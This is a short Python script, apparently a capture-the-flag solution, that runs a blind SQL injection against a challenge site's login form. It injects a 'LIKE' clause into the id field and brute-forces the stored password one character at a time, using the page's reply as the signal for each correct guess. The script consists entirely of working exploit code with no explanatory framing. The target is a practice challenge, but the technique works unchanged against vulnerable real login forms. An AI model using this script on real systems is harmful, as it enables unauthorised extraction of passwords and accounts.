import requests

mylist = 'abcdefghijklmnopqrstuvwxyz0123456789'
input_username = "' or pass LIKE '{}%';"
url = "http://ctfq.u1tramarine.blue/q6/"

def brute_force(u) :
    for i in mylist:
        fak_username = u + i
        data_dict = {"id": input_username.format(fak_username), "pass": ''}
        response = requests.post(url, data=data_dict)
        if "Don't worry." in str(response.text) :
            print("FOUND: " + fak_username)
            return brute_force(fak_username)
    return u


true_password = brute_force('FLAG_')
print("Pass:" + str(true_password))

true_user = brute_force('')
print("User:" + str(true_user))
